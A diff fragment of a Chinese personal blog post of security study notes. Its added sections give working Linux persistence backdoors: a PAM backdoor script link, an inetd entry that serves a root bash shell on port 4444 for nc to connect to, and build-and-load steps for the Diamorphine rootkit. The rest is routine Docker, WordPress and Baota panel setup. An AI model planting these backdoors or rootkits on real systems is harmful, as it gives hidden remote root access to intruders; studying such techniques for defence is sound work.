+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">确保ssh开启pam支持</span><br><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line">UsePAM yes</span><br><span class="line">自动化脚本</span><br><span class="line">https://github.com/litsand/shell/blob/master/pam.sh</span><br></pre></td></tr></table></figure>
+<h2 id="inetd服务后门"><a href="#inetd服务后门" class="headerlink" title="inetd服务后门"></a>inetd服务后门</h2><p>inetd是一个监听外部网络请求(就是一个socket)的系统守护进程，默认情况下为13端口。当inetd接收到一个外部请求后，它会根据这个请求到自己的配置文件中去找到实际处理它的程序，然后再把接收到的这个socket交给那个程序去处理。所以，如果我们已经在目标系统的inetd配置文件中配置好，那么来自外部的某个socket是要执行一个可交互的shell，就获取了一个后门。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 安装服务  </span><br><span class="line">    sudo apt install openbsd-inetd</span><br><span class="line">2. 修改默认端口  </span><br><span class="line">	sudo vim /etc/services  </span><br><span class="line">	在里面添加woot 4444/tcp </span><br><span class="line">3. 修改/etc/inetd.conf  </span><br><span class="line">    woot stream tcp nowait root /bin/bash bash -i</span><br><span class="line">4. sudo inetd 运行服务</span><br><span class="line">5. kali使用nc连接 ，nc  192.168.1.146  4444</span><br></pre></td></tr></table></figure>
+<h2 id="Rootkit"><a href="#Rootkit" class="headerlink" title="Rootkit"></a>Rootkit</h2><p>rootkit分为内核级和应用级两种:内核级的比如：Diamorphine，应用级的比如：Mafix<br>通过伪造ssh协议漏洞实现远程登陆，特点是配置简单并可以自定义验证密码和端口号。<br>首先是获得远程服务器的root权限，然后下载rootkit程序，使用具体查看github</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/m0nad/Diamorphine.git</span><br><span class="line">cd Diamorphine&amp;&amp;make</span><br><span class="line">insmod diamorphine.ko</span><br></pre></td></tr></table></figure>
 <h1 id="docker搭建文章网站"><a href="#docker搭建文章网站" class="headerlink" title="docker搭建文章网站"></a>docker搭建文章网站</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cp /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup </span><br><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo [http://mirrors.aliyun.com/repo/Centos-7.repo]</span><br><span class="line"></span><br><span class="line">curl -o /etc/yum.repos.d/epel.repo [http://mirrors.aliyun.com/repo/epel-7.repo]</span><br><span class="line">yum clean all </span><br><span class="line">yum makecache</span><br><span class="line">yum install net-tools.x86_64 -y </span><br><span class="line">yum -y install epel-release</span><br><span class="line">yum -y install vim</span><br><span class="line">yum install unzip -y  </span><br><span class="line">yum search wget -y</span><br><span class="line">yum install -y git </span><br><span class="line">yum install docker -y </span><br><span class="line">yum -y install python-pip </span><br><span class="line">yum install -y docker-compose</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>
 <p>部署到服务器</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">先加速：tee /etc/docker/daemon.json &lt;&lt; &#x27;EOF&#x27; </span><br><span class="line">&#123; </span><br><span class="line">&quot;registry-mirrors&quot;:[&quot;[https://lkdykb0x.mirror.aliyuncs.com](https://lkdykb0x.mirror.aliyuncs.com)&quot;,&quot;[https://registry.docker-cn.com](https://registry.docker-cn.com)&quot;,&quot;[https://docker.mirrors.ustc.edu.cn](https://docker.mirrors.ustc.edu.cn)&quot;,&quot;[https://dockerhub.azk8s.cn](https://dockerhub.azk8s.cn)&quot;,&quot;[http://hub-mirror.c.163.com](http://hub-mirror.c.163.com)&quot;,&quot;[http://qtid6917.mirror.aliyuncs.com](http://qtid6917.mirror.aliyuncs.com)&quot;,&quot;[https://rncxm540.mirror.aliyuncs.com](https://rncxm540.mirror.aliyuncs.com)&quot;,&quot;[https://e9yneuy4.mirror.aliyuncs.com](https://e9yneuy4.mirror.aliyuncs.com)&quot;]</span><br><span class="line">&#125;  </span><br><span class="line">EOF</span><br><span class="line">systemctl daemon-reload &amp;&amp; systemctl restart docker</span><br></pre></td></tr></table></figure>
@@ -255,7 +431,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker pull eugeneware/docker-wordpress-nginx</span><br><span class="line">git clone [https://github.com/eugeneware/docker-wordpress-nginx.git] </span><br><span class="line">cd docker-wordpress-nginx</span><br><span class="line">sudo docker build -t=&quot;eugeneware/docker-wordpress-nginx&quot; .</span><br><span class="line">sudo docker run -p 80:80 --name docker-wordpress-nginx -d eugeneware/docker-wordpress-nginx</span><br><span class="line">sudo docker start docker-wordpress-nginx</span><br></pre></td></tr></table></figure>
 <p>#lamp<br>是指一组通常一起使用来运行动态网站或者服务器的自由软件名称<br>linux Apache&#x2F;Nginx mysql PhP(5.6)</p>
 <h1 id="安装宝塔面板"><a href="#安装宝塔面板" class="headerlink" title="安装宝塔面板"></a>安装宝塔面板</h1><p>linux中运行自己的网站<br><code>yum install -y wget &amp;&amp; wget -O install.sh [https://download.bt.cn/install/install_6.0.sh](https://download.bt.cn/install/install_6.0.sh) &amp;&amp; sh install.sh ed8484bec</code><br><img src="/../img/Pasted%20image%2020240719163847.png">输入bt进入宝塔控制面板<br>停掉冲突的80端口方法<br><img src="/../img/Pasted%20image%2020240719150235.png"><br><img src="/../img/Pasted%20image%2020240719185019.png"></p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">仰泳鱼</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/07/19/2024-07-19/">http://example.com/2024/07/19/2024-07-19/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">欢迎来到我的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2024/07/11/bKrwGlYSe5hQ8xf.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/07/20/2024-07-20/" title="十一"><img class="cover" src="https://s2.loli.net/2024/07/11/OkDMqp8b7muvN9C.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">十一</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/17/2024-07-17/" title="九"><img class="cover" src="https://s2.loli.net/2024/07/11/ZGr2mBLazCbIUAt.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">九</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/07/11/Dl2NuA1dKsQm3wn.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">仰泳鱼</div><div class="author-info__description">仅供分享个人研究成果</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">56</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/1234567fang"><i class="fab fa-github"></i><span>关注我</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/1234567fang" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">今日事，今日毕</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8C%87%E4%BB%A4%E8%AE%B0%E5%BF%86"><span class="toc-number">1.</span> <span class="toc-text">操作系统指令记忆</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux"><span class="toc-number">1.1.</span> <span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows"><span class="toc-number">1.2.</span> <span class="toc-text">Windows</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E6%96%87%E4%BB%B6%E5%90%8D%E8%A7%A3%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">Linux文件名解析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#docker%E6%90%AD%E5%BB%BA%E6%96%87%E7%AB%A0%E7%BD%91%E7%AB%99"><span class="toc-number">3.</span> <span class="toc-text">docker搭建文章网站</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF"><span class="toc-number">4.</span> <span class="toc-text">安装宝塔面板</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/01/06/2025-01-06/" title="无题"><img src="https://s2.loli.net/2024/07/11/OkDMqp8b7muvN9C.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2025/01/06/2025-01-06/" title="无题">无题</a><time datetime="2025-01-05T16:00:00.000Z" title="发表于 2025-01-06 00:00:00">2025-01-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/04/2025-01-04/" title="内网4"><img src="https://s2.loli.net/2024/07/11/bKrwGlYSe5hQ8xf.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网4"/></a><div class="content"><a class="title" href="/2025/01/04/2025-01-04/" title="内网4">内网4</a><time datetime="2025-01-03T16:00:00.000Z" title="发表于 2025-01-04 00:00:00">2025-01-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/03/2025-01-03/" title="内网3"><img src="https://s2.loli.net/2024/07/11/3p72al5i9FCwBKj.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网3"/></a><div class="content"><a class="title" href="/2025/01/03/2025-01-03/" title="内网3">内网3</a><time datetime="2025-01-02T16:00:00.000Z" title="发表于 2025-01-03 00:00:00">2025-01-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/02/2025-01-02/" title="内网2"><img src="https://s2.loli.net/2024/07/11/VqCFHvzbt6WDOMk.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网2"/></a><div class="content"><a class="title" href="/2025/01/02/2025-01-02/" title="内网2">内网2</a><time datetime="2025-01-01T16:00:00.000Z" title="发表于 2025-01-02 00:00:00">2025-01-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/31/2024-12-31/" title="内网1"><img src="https://s2.loli.net/2024/07/11/3p72al5i9FCwBKj.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网1"/></a><div class="content"><a class="title" href="/2024/12/31/2024-12-31/" title="内网1">内网1</a><time datetime="2024-12-30T16:00:00.000Z" title="发表于 2024-12-31 00:00:00">2024-12-31</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By 仰泳鱼</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">仰泳鱼</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/07/19/2024-07-19/">http://example.com/2024/07/19/2024-07-19/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">欢迎来到我的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2024/07/11/ZGr2mBLazCbIUAt.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/07/20/2024-07-20/" title="十一"><img class="cover" src="https://s2.loli.net/2024/07/11/hkNDJcFqupasnZV.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">十一</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/17/2024-07-17/" title="九"><img class="cover" src="https://s2.loli.net/2024/07/11/OkDMqp8b7muvN9C.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">九</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/07/11/Dl2NuA1dKsQm3wn.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">仰泳鱼</div><div class="author-info__description">仅供分享个人研究成果</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">56</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/1234567fang"><i class="fab fa-github"></i><span>关注我</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/1234567fang" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">今日事，今日毕</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">操作系统基本命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux"><span class="toc-number">1.1.</span> <span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows"><span class="toc-number">1.2.</span> <span class="toc-text">Windows</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E6%96%87%E4%BB%B6%E5%90%8D%E5%90%AB%E4%B9%89"><span class="toc-number">2.</span> <span class="toc-text">Linux文件名含义</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E6%8C%81%E4%B9%85%E5%8C%96%E5%90%8E%E9%97%A8"><span class="toc-number">3.</span> <span class="toc-text">Linux持久化后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">3.1.</span> <span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vim%E5%90%8E%E9%97%A8"><span class="toc-number">3.2.</span> <span class="toc-text">Vim后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH"><span class="toc-number">3.3.</span> <span class="toc-text">SSH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUID"><span class="toc-number">3.4.</span> <span class="toc-text">SUID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PAM%E5%90%8E%E9%97%A8"><span class="toc-number">3.5.</span> <span class="toc-text">PAM后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#inetd%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-number">3.6.</span> <span class="toc-text">inetd服务后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rootkit"><span class="toc-number">3.7.</span> <span class="toc-text">Rootkit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#docker%E6%90%AD%E5%BB%BA%E6%96%87%E7%AB%A0%E7%BD%91%E7%AB%99"><span class="toc-number">4.</span> <span class="toc-text">docker搭建文章网站</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF"><span class="toc-number">5.</span> <span class="toc-text">安装宝塔面板</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/07/19/2025-07-19/" title="无题"><img src="https://s2.loli.net/2024/07/11/VqCFHvzbt6WDOMk.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2025/07/19/2025-07-19/" title="无题">无题</a><time datetime="2025-07-19T02:06:02.945Z" title="发表于 2025-07-19 10:06:02">2025-07-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/15/%E5%BA%94%E6%80%A5%E9%9D%B6%E6%9C%BA/" title="玄机应急响应"><img src="https://s2.loli.net/2024/07/11/3p72al5i9FCwBKj.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="玄机应急响应"/></a><div class="content"><a class="title" href="/2025/04/15/%E5%BA%94%E6%80%A5%E9%9D%B6%E6%9C%BA/" title="玄机应急响应">玄机应急响应</a><time datetime="2025-04-15T12:51:00.084Z" title="发表于 2025-04-15 20:51:00">2025-04-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/27/2025-02-27/" title="无题"><img src="https://s2.loli.net/2024/07/11/ZGr2mBLazCbIUAt.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2025/02/27/2025-02-27/" title="无题">无题</a><time datetime="2025-02-27T02:10:52.046Z" title="发表于 2025-02-27 10:10:52">2025-02-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/21/2025-02-21/" title="任意邮件伪造"><img src="https://s2.loli.net/2024/07/11/3p72al5i9FCwBKj.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="任意邮件伪造"/></a><div class="content"><a class="title" href="/2025/02/21/2025-02-21/" title="任意邮件伪造">任意邮件伪造</a><time datetime="2025-02-20T16:00:00.000Z" title="发表于 2025-02-21 00:00:00">2025-02-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/20/2025-02-20/" title="APP与小程序"><img src="https://s2.loli.net/2024/07/11/hkNDJcFqupasnZV.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="APP与小程序"/></a><div class="content"><a class="title" href="/2025/02/20/2025-02-20/" title="APP与小程序">APP与小程序</a><time datetime="2025-02-19T16:00:00.000Z" title="发表于 2025-02-20 00:00:00">2025-02-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By 仰泳鱼</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
   const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
   if ($mermaid.length === 0) return
   const runMermaid = () => {
